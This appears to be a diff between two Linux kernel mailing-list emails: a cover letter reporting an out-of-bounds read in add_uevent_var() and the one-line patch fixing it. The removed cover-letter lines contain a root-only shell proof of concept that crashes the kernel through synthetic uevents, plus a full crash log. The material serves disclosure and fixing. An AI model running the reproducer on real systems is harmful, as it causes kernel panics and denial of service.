@@ -1,82 +1,84 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.216.51
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.216.49
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1795436205;
-	b=O4t2QOZ/34KwkBVkeE6VxwLXExs4jymkYhTR1khmKsCFUPClG/FMXQ/2WpXluw7LbcRx
-	 cWextL3Puz0x3pawQh9Eo/XDvtXlM1jPvk/Ktfvfd82WJx0YraQs+9QbU60T6szwA8W2E
-	 9r7nT5USvxi8w1R6vsvPGh9ZBPfESM00WovUKZ1T0JvkV7pzlRAUD6qb5sQWTDmLp5xwT
-	 yxwzcKxQMRpRMjN4/hVybKtsRShADl5DTaxPFPz0GZTVfOxynt/7iZOzBahx85KvYWBoz
-	 mdxd2Bk6mAoJLFla5yMdFtGDhsQxe/oCc4UgxU8BtdiOwUIKtATQQvqU/Xwh2cZx3aA==
+	t=1795436209;
+	b=xSZTPoroIhBrcHRFX4n+7r9zDk0zi/FTxt6Av1a0KqTmhKGz7iO7aPCLUITg3VXssyem
+	 XnmmGxdgCZuP0ezoI5DB1cf+do107fn0mjTBPOL8AoM3NLsws4DxNozDOZtApfElCLFJm
+	 oOYX9WvZ3N2jC2BRM1MQvfBpXs+klCSEJjA0wtzgao1L6yi58MvYeTnLzvMQKnAJA5sNl
+	 VrkpxKaIgwg4Xji+5Lx/RCvb/dcA0dk9smijMPYakjU5Iw4maBWU/UZxvDc2ZdYq+Sy47
+	 ufnyX3i7x87d/Rz0DwluIGD8tUACXui4Z08mRl0r/XLhbvUI2psVN684orn7+KsJ3eQ==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1795436205;
+	a=rsa-sha256; c=relaxed/relaxed; t=1795436209;
 	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
 	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
-	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
-	 Content-Transfer-Encoding;
-	bh=VkE7Vjq+Mj2kI9OgXXiloalWcp8Wq6iPLh1LkUcmpFg=;
-	b=NT9eNpZW0qUwRUM89Us3p5P/27LaN8fbVKd5l73Ij/m4FixFBR9wFErQ14K3GVivcA0D
-	 B0EmcuYUweFGzOBWO+zk9zALNHd76bAn2I77B8zt6GUFT+q3wQTHd0+pd0LXijQpcvrc/
-	 I2Z+n0QsZ0s5dI6iFOgMmsLHyaeLCIbT1r0cN7mL1NEzymW8DcxcEbkffCKBc0BD/4kcq
-	 iQTwD/taoebMAX/NEy5h7i50MOhFCBCuVGdq1vbdGPI+tlUZhZd/Ndwm/WPjm80zBt4i+
-	 iDRqY2TSkkJoY41VwYrIFwjtWLxQFAtaWhKHHIHCeyxvvCRiPpXOKvVp7TdP39RWE1Q==
+	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:In-Reply-To:References:
+	 MIME-Version:Content-Transfer-Encoding;
+	bh=e4OCxwaZr9TnfdRR/mUAU5CvloH0RPFSydGvfkrf2yc=;
+	b=IYFL0wUztNTLSUwsJ3YBxIwHG9EuNebHWk5ZmUJcApL7uth3Xc70zBvQsH2bmzytUfNE
+	 3w+18oZhXx/GLktoHq2qdxYVi99U8bkx6nPSMEg/YDmJgjZTK+wCu89tofPJDVi0AdTru
+	 +bwGZeWmEWqSWx2XVqor5edAsYwFsypNNuNAonk8G36Dbs1aMLrNwnGlwTW6pdEX9dQXu
+	 qzu0ygeUfADQ3s+m7rj8N6XBTRTnf4V6FdPj7DH8HWJ/Y5VpaRC+SaWNSSGQyU8aBpAmY
+	 LAloA51eYXwZQNE3QXJKliZ1reCNYsQJ682QYj5oXD9813BWrfhSG05MeMQRt1kIa8A==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
 	dmarc=pass header.from=nebusec.ai;
 	spf=pass smtp.mailfrom=nebusec.ai;
-	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=eUffSFdI;
-	arc=none smtp.remote-ip=209.85.216.51
-Received: from mail-pj1-f51.google.com (mail-pj1-f51.google.com [209.85.216.51])
+	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=MXwK0juR;
+	arc=none smtp.remote-ip=209.85.216.49
+Received: from mail-pj1-f49.google.com (mail-pj1-f49.google.com [209.85.216.49])
 	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 21C6A606A31E
-	for <driver-core@lists.linux.dev>; Mon, 23 Nov 2026 12:16:45 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 21C6A606A31E
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id BD545606A332
+	for <driver-core@lists.linux.dev>; Mon, 23 Nov 2026 12:16:48 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org BD545606A332
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=eUffSFdI
-Received: by mail-pj1-f51.google.com with SMTP id 98e67ed59e1d1-3b3d4d3bba3so1574850a91.3
-        for <driver-core@lists.linux.dev>; Mon, 23 Nov 2026 04:16:44 -0800 (PST)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=MXwK0juR
+Received: by mail-pj1-f49.google.com with SMTP id 98e67ed59e1d1-3b0ae87069dso1234627a91.2
+        for <driver-core@lists.linux.dev>; Mon, 23 Nov 2026 04:16:48 -0800 (PST)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1795436204; x=1796041004; darn=lists.linux.dev;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=VkE7Vjq+Mj2kI9OgXXiloalWcp8Wq6iPLh1LkUcmpFg=;
-        b=eUffSFdIafwgVuetZis0YmBu4oOQQ/ltGYlEqEnweIRJEa5HtPgbZKLffRrsiONq7O
-         tm9NWE3ojjhrig0LsF8TEk7jL1x9Mb/IyY5vZYPebAjcjAktn7rAMhQNQ4zWESwt6BxH
-         hXD0pepBEVbntPYvykhUVbwoABbdfj/omQWACNojI0J6r96eB0XU9ZkPQ2KPGp7J9tMB
-         rccA+O3yHlkELnXnO02b1d20bLZb8z8Qy6nEaoOsX3Ypyp2K8OjntqBg9HLxsvkSUkw7
-         3diHK+aAry0sj8Q9mz1Unthrrn1yoVfx6ZIfrdT0l07i3icyUhIVV104HR+8X2x63i/W
-         xUZA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1795436204; x=1796041004;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=nebusec.ai; s=google; t=1795436208; x=1796041008; darn=lists.linux.dev;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=VkE7Vjq+Mj2kI9OgXXiloalWcp8Wq6iPLh1LkUcmpFg=;
-        b=PZ/8z9nAQ0bWuj2fA7awdlngR8mBpU3ph1mnv7edZ5PjkkkPP89s5rSqmW++P2Nv+H
-         qRUDPpaAEnm8M8lWx4WF/H/2muTXEI6ekBU8SIDQHwA2pYq6yzxd4PxicuO5EDfy9LCi
-         /qN2PaHXjKqcr62Xxz1c/sr8JZL8nj5hpJFgtISOCTjoHQ0zjyfPL6wr06AlS8rBLL7x
-         o7+yP/33OI89XJQ8RoBc+RCpQiYWnoOhZ9JOGLV91or2pFqJQv145Wv+GIvp7RpHHsod
-         hyTikiL+MlA8YMPyKbKhzilCW/7mHwT66bnKTGFUll/IvUQvajGVGdWtS8FarTZ/pjda
-         VZEg==
-X-Forwarded-Encrypted: i=1; AL+hErGALBvGybUM453fDLxbKz35VshTyqs1KG4Ta3Gxf+NJVH/NTL+VkYSobszbiKe2q9WYh968+G0nklQvVg==@lists.linux.dev
-X-Gm-Message-State: APuU4Z/Mm/qZ/quS4iGauqTt5PNXuaA6FKBe0OnrVtB3XsxNgMd19jlt
-	2ECYoNObAU4Rvz5grh84o6cs9E+xeIXeEjdzFYHyPVph2qcRtHu46C+L2/tglrlSEYws
-X-Gm-Gg: AZFdTZeGCWZRwv1fGpVCtshKT3qu5xuNWkGm8Tzt2c5se/U/1ZJy5DNeYwVvYTBDrg9
-	TAPai0n9/UEbIjSxdFB6XiXuho5SmsHZ6oY5Sj3tuRP11c1O8gDOQX/EIcH49c/Qx4BjBhau1ym
-	kdT6nfcefR00TDfd+l4h89zcCbrDsf+5G78da+ZhOMQkqYvAVlY7mFJnNunIny/N2QguF91WQ2d
-	pGldXfplV2p/cniNsnoRXkE8ZrIe2nxIILDOdXLX2V89G/Qk3x9QV6naWvP9SaVokvuZuWSkIld
-	VTRcGFlSdfLcnI6v7s0d6bdcEG+OMAoJIHlAwqqlk+NelzMR7arxISkuVn55oRn3nDMLCQZYaV0
-	8kC629BSsTPTKa+o3i66kuK16vxr5yd9JxH1XH7LBcslUJyFQt9fE/d5zbzWMc+e8x0E9X3iF2L
-	fTyiLYfw8/56AnFJ/ohGqbTJML3U1V1YU+jt4YpqzuIuElFg0xJ4dXx5uT7GVvIq8UnAOdsIyRU
-	LkL8OUFC6ElbM1EYmlZjqvTUgkK2oUx2fp9QPTTuckg2uzLnTj1n88LRnM+e89KJa7GIKfuF0jM
-	GmUhTzfVEEmXRxKDh0T7TFfRCclAboab7/gcOwAC
-X-Received: by 2002:a17:90b:2fcd:b0:3ad:b8c8:4a84 with SMTP id 98e67ed59e1d1-3b41c925e29mr10077702a91.26.1795436204098;
-        Mon, 23 Nov 2026 04:16:44 -0800 (PST)
+        bh=e4OCxwaZr9TnfdRR/mUAU5CvloH0RPFSydGvfkrf2yc=;
+        b=MXwK0juRAdjh4vZtNds+Nb0h6kkXdZ29TUZobTv97UHC/s+ZLLAXa3xJvdp3cqTHFT
+         GIRBj/Git5z+ZjNaCNO/fx0S8e/EMg2YE79NpaaNaquJ4GH0gagnOMSf25GlPdHzuh/4
+         ei9u19FLA+6GQxOwJgELVhvvwYcWash/FxYU1RSnaSqh2c6TkogRhBl1aYDCsllk1YZu
+         XU3Z8CYldXqWU+jx1WH33EnIT4dvCdUuaE6DEYGyPDIpwP9ClY+0y4qsN7R482dZPMro
+         5vYR0vVyKmjF+ayeKRfZ5CiQBZr99xUY2sSrNaXcMy4z02q9K66WMRHTEi8ThGtCWlwM
+         PtPQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1795436208; x=1796041008;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=e4OCxwaZr9TnfdRR/mUAU5CvloH0RPFSydGvfkrf2yc=;
+        b=IG6WZU0pfz2inkz7BdpnGxA1++ZITkT9jHm2ImbynHTtbq8xBY2VPfv8qC7xQ6jDwS
+         cgJ/hVqraxlmqH3V0NoeN01iad/YOOxPWx97p67YzL2tRE9EObBz3dYdxUwT9fZdI5nj
+         4SyBibGMvYm7l31pVLCp5kI2u8bcjXSlIMjs7qDwoUAb2wqOqFFQzZOriMUZSSAWraI3
+         Ak3xikCstfKbn2/KJcGkW/VR44UBweZqHXDOcLIezBoncGXSBavljTh8bpp2f/BXG5X8
+         KR2f24Q2keaXf2R1Inn/wZ9yMgEx1w10Tko5wcXREGYJQ4qMM7atu9rYeYB/H2KGL56g
+         M1SA==
+X-Forwarded-Encrypted: i=1; AL+hErG0cS2yx1XRpoEP+lVloKmodPFnf2uj1XOtp1kOCtqk9MFl9heaL+Rgmrod9UchiHXsmrsw+p+mLg0Srw==@lists.linux.dev
+X-Gm-Message-State: APuU4Z8dbENb6tgpGFUghjlDGHiBlfIEFbu7fe6TECgF85aG517oIs4C
+	6aQz7r+WqfXdDq8ayslPzxZVQV+hYz/IrP9qWQTr1CdLhwHelcPleXV2jVGIoTXBDMADV1ec17N
+	p7028Sw==
+X-Gm-Gg: AZFdTZdYWy+lSIG7JT+1ZmXetHfqbCrjQaVABWBkT5mcQj0Jq1ReGoQTmBT4Zjei+GP
+	8wQqIWtQJbWvdBAT9TcOYNKVcWH1MA814d4/RTXapsuhwEpxHAArZHnM/C/UXOgqk33lK0IkRNW
+	6yiPRJK6E/EUBkY3zwz8zYs+zmF7jx7thz+qRS+gmAV76ebMNav45/LliB+YeOvp3Cs+athdpz0
+	HfETJhBHjiZWm7qt9rofLl3HpsrCenszdMI6YVlO98QkiMJ6afkSZbrhG2U68SgqH5TWobhMwKn
+	XbhMThEpyZWbS3ivHnfIpDej+G0DRyjYm2fZslY0xGUKl8Fh7LPzITfxa+fBYoZ1yaO/YAQHVp5
+	hDka3ZHEQnyumUso2xhdxpS3f9Gw746CuHGC7Jl6/ucHsKNpJMCjRB4isa/dC15KGhSDpakvlhJ
+	3e2xk2HoDXPyhbC442LtR3hLkuOi6FSETrpTRhu3pXvu9dvt5N7k58QMAd+R55kU9fIY/Ui8DpI
+	TxSN+tFVZ75jPOiUb7XCCN5O3aAH4P0Y3PPumnDloMys94CUfUy6hpVl/owqSDfSoTTX7enCLGm
+	eXHjVVA+9l/jwYG4vBraFgBJKzG/RfdG2yYQQw6Bz5cbLX4E5rJr+UMa2hLeKg==
+X-Received: by 2002:a17:90a:e70f:b0:3b3:c8dc:a109 with SMTP id 98e67ed59e1d1-3b41c7abf75mr9733374a91.6.1795436208040;
+        Mon, 23 Nov 2026 04:16:48 -0800 (PST)
 Received: from enjou-Legion-Y7000P-2019 ([191.223.218.36])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3b40578dca0sm21112338a91.2.2026.11.23.04.16.40
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3b40578dca0sm21112338a91.2.2026.11.23.04.16.44
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Mon, 23 Nov 2026 04:16:43 -0800 (PST)
+        Mon, 23 Nov 2026 04:16:47 -0800 (PST)
 From: Ren Wei <weir@nebusec.ai>
 To: linux-kernel@vger.kernel.org,
 	driver-core@lists.linux.dev
@@ -89,10 +91,12 @@ Cc: gregkh@linuxfoundation.org,
 	vega@nebusec.ai,
 	caoruide123@gmail.com,
 	weir@nebusec.ai
-Subject: [PATCH driver-core 0/1] kobject: reserve an envp slot for the terminator
-Date: Mon, 23 Nov 2026 20:16:36 +0800
-Message-ID: <cover.1795426787.git.caoruide123@gmail.com>
+Subject: [PATCH driver-core 1/1] kobject: reserve an envp slot for the terminator
+Date: Mon, 23 Nov 2026 20:16:37 +0800
+Message-ID: <cd35c5682ebe0f5a58fa6beed90bb7d0e7d5e9a2.1795426787.git.caoruide123@gmail.com>
 X-Mailer: git-send-email 2.53.0
+In-Reply-To: <cover.1795426787.git.caoruide123@gmail.com>
+References: <cover.1795426787.git.caoruide123@gmail.com>
 X-Mailing-List: driver-core@lists.linux.dev
 List-Id: <driver-core.lists.linux.dev>
 List-Post: <mailto:driver-core@lists.linux.dev>
@@ -106,143 +110,39 @@ Content-Transfer-Encoding: 8bit
 
 From: Ruide Cao <caoruide123@gmail.com>
 
-Hi Linux kernel maintainers,
+add_uevent_var() currently allows envp_idx to reach ARRAY_SIZE(envp).
+This fills the final pointer slot without leaving room for the NULL
+terminator expected by usermode helper consumers.
 
-We found an issue in lib/kobject_uevent.c.
+A synthetic uevent can supply enough variables to make this happen.
+When CONFIG_UEVENT_HELPER is enabled, kernel_execve() then scans beyond
+the array while counting the environment and may dereference arbitrary
+data as a string pointer.
 
-This bug is tracked at: https://bugtracker.nebusec.ai/f/16082
+Reserve the final slot so an environment is always terminated.
 
-add_uevent_var() permits envp_idx to reach ARRAY_SIZE(env->envp), filling
-the final pointer slot without reserving a trailing NULL. With
-CONFIG_UEVENT_HELPER and a nonempty helper path, an event containing
-exactly 61 variables before SEQNUM causes SEQNUM, HOME, and PATH to fill
-all 64 slots. call_usermodehelper then asynchronously passes this
-unterminated array to kernel_execve(). count_strings_kernel() reads beyond
-envp into envp_idx and env->buf, interprets those bytes as pointers, and
-later dereferences invalid addresses while copying the environment.
-Synthetic arguments allow the environment count to be tuned, resulting in
-an out-of-bounds scan and kernel crash.
-
-Privilege model: writing a synthetic uevent to /sys/module/kernel/uevent
-and setting /proc/sys/kernel/hotplug require CAP_SYS_ADMIN; the
-reproducer runs as root. The crash also depends on CONFIG_UEVENT_HELPER
-and a nonempty helper path.
-
-Compatibility: no uAPI change.
-
-Reproducer:
-
-#!/bin/sh
-set -eu
-
-# This PoC must run as root inside the guest.
-printf '%s' /bin/true > /proc/sys/kernel/hotplug
-echo 0 > /proc/sys/kernel/panic_on_warn
-
-msg='add 11111111-1111-1111-1111-111111111111'
-i=1
-while [ "$i" -le 57 ]; do
-	msg="$msg K$i=V$i"
-	i=$((i + 1))
-done
-
-printf '%s\n' "$msg" > /sys/module/kernel/uevent
-sleep 2
-
-
-
-We run the PoC in a 2 GB RAM x86 QEMU environment.
-
-------BEGIN PoC------
-
-#!/bin/sh
-set -eu
-
-# This PoC must run as root inside the guest.
-printf '%s' /bin/true > /proc/sys/kernel/hotplug
-echo 0 > /proc/sys/kernel/panic_on_warn
-
-msg='add 11111111-1111-1111-1111-111111111111'
-i=1
-while [ "$i" -le 57 ]; do
-	msg="$msg K$i=V$i"
-	i=$((i + 1))
-done
-
-printf '%s\n' "$msg" > /sys/module/kernel/uevent
-sleep 2
-
-
-------END PoC--------
-
-----BEGIN crash log----
-
-[  161.975900][ T1043] BUG: unable to handle page fault for address: 0000000000656c75
-[  161.977567][ T1043] #PF: supervisor read access in kernel mode
-[  161.978836][ T1043] #PF: error_code(0x0000) - not-present page
-[  161.979824][ T1043] PGD 0 P4D 0
-[  161.980319][ T1043] Oops: Oops: 0000 [#1] SMP KASAN NOPTI
-[  161.981257][ T1043] CPU: 0 UID: 0 PID: 1043 Comm: kworker/u16:0 Not tainted 6.12.95 #4 53deed68f5e8c87eac9412ec2ca16e6c37d9fe62
-[  161.983040][ T1043] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[  161.985205][ T1043] RIP: 0010:strnlen+0x1b/0x40
-[  161.986083][ T1043] Code: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 48 8d 14 37 48 89 f8 48 85 f6 75 0b eb 21 48 83 c0 01 48 39 c2 74 0d <80> 38 00 75 f2 48 29 f8 e9 c3 bd 36 00 48 89 d0 48 29 f8 e9 b8 bd
-[  161.989083][ T1043] RSP: 0018:ffffc90003127e30 EFLAGS: 00010206
-[  161.990058][ T1043] RAX: 0000000000656c75 RBX: ffff88810df296a8 RCX: ffffffff81f0516d
-[  161.991261][ T1043] RDX: 0000000000676c75 RSI: 0000000000020000 RDI: 0000000000656c75
-[  161.992481][ T1043] RBP: ffff888110090040 R08: 0000000000000001 R09: fffff9400006ea00
-[  161.993709][ T1043] R10: ffffea00003751f7 R11: 0000000000000001 R12: 0000000000656c75
-[  161.994995][ T1043] R13: ffff888117b20200 R14: ffff88810df29010 R15: dffffc0000000000
-[  161.996234][ T1043] FS:  0000000000000000(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
-[  161.997606][ T1043] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-[  161.998664][ T1043] CR2: 0000000000656c75 CR3: 0000000008534002 CR4: 0000000000770ef0
-[  161.999992][ T1043] PKRU: 55555554
-[  162.000517][ T1043] Call Trace:
-[  162.001100][ T1043]  <TASK>
-[  162.001523][ T1043]  copy_string_kernel+0x27/0x440
-[  162.002422][ T1043]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  162.003347][ T1043]  ? __asan_memcpy+0x3c/0x60
-[  162.004120][ T1043]  copy_strings_kernel+0x92/0x130
-[  162.004951][ T1043]  kernel_execve+0x201/0x2e0
-[  162.005615][ T1043]  call_usermodehelper_exec_async+0x21f/0x440
-[  162.006658][ T1043]  ? trace_hardirqs_on+0x5b/0x110
-[  162.007530][ T1043]  ? __pfx_call_usermodehelper_exec_async+0x10/0x10
-[  162.008499][ T1043]  ret_from_fork+0x31/0x70
-[  162.009271][ T1043]  ? __pfx_call_usermodehelper_exec_async+0x10/0x10
-[  162.010331][ T1043]  ret_from_fork_asm+0x1a/0x30
-[  162.011099][ T1043]  </TASK>
-[  162.011639][ T1043] Modules linked in:
-[  162.012264][ T1043] CR2: 0000000000656c75
-[  162.012984][ T1043] ---[ end trace 0000000000000000 ]---
-[  162.013800][ T1043] RIP: 0010:strnlen+0x1b/0x40
-[  162.014558][ T1043] Code: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 48 8d 14 37 48 89 f8 48 85 f6 75 0b eb 21 48 83 c0 01 48 39 c2 74 0d <80> 38 00 75 f2 48 29 f8 e9 c3 bd 36 00 48 89 d0 48 29 f8 e9 b8 bd
-[  162.017573][ T1043] RSP: 0018:ffffc90003127e30 EFLAGS: 00010206
-[  162.018548][ T1043] RAX: 0000000000656c75 RBX: ffff88810df296a8 RCX: ffffffff81f0516d
-[  162.019831][ T1043] RDX: 0000000000676c75 RSI: 0000000000020000 RDI: 0000000000656c75
-[  162.021036][ T1043] RBP: ffff888110090040 R08: 0000000000000001 R09: fffff9400006ea00
-[  162.022264][ T1043] R10: ffffea00003751f7 R11: 0000000000000001 R12: 0000000000656c75
-[  162.023449][ T1043] R13: ffff888117b20200 R14: ffff88810df29010 R15: dffffc0000000000
-[  162.024845][ T1043] FS:  0000000000000000(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
-[  162.026300][ T1043] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-[  162.027378][ T1043] CR2: 0000000000656c75 CR3: 0000000008534002 CR4: 0000000000770ef0
-[  162.028229][ T1043] PKRU: 55555554
-[  162.028615][ T1043] Kernel panic - not syncing: Fatal exception
-[  162.029525][ T1043] Kernel Offset: disabled
-[  162.030001][ T1043] Rebooting in 10 seconds..
-
-
------END crash log-----
-
-Best regards,
-Ruide Cao
-
-Ruide Cao (1):
-  kobject: reserve an envp slot for the terminator
-
+Fixes: 7eff2e7a8b65 ("Driver core: change add_uevent_var to use a struct")
+Cc: stable@vger.kernel.org
+Reported-by: Vega <vega@nebusec.ai>
+Signed-off-by: Ruide Cao <caoruide123@gmail.com>
+Signed-off-by: Ren Wei <weir@nebusec.ai>
+---
  lib/kobject_uevent.c | 2 +-
  1 file changed, 1 insertion(+), 1 deletion(-)
 
-
-base-commit: b6a9fa34ce4187cb69d3c588a4bbffc31ce5db8f
+diff --git a/lib/kobject_uevent.c b/lib/kobject_uevent.c
+index 1d29378d4f55..f7aa67d6ee54 100644
+--- a/lib/kobject_uevent.c
++++ b/lib/kobject_uevent.c
+@@ -673,7 +673,7 @@ int add_uevent_var(struct kobj_uevent_env *env, const char *format, ...)
+ 	va_list args;
+ 	int len;
+ 
+-	if (env->envp_idx >= ARRAY_SIZE(env->envp)) {
++	if (env->envp_idx >= ARRAY_SIZE(env->envp) - 1) {
+ 		WARN(1, KERN_ERR "add_uevent_var: too many keys\n");
+ 		return -ENOMEM;
+ 	}
 -- 
 2.47.3
 
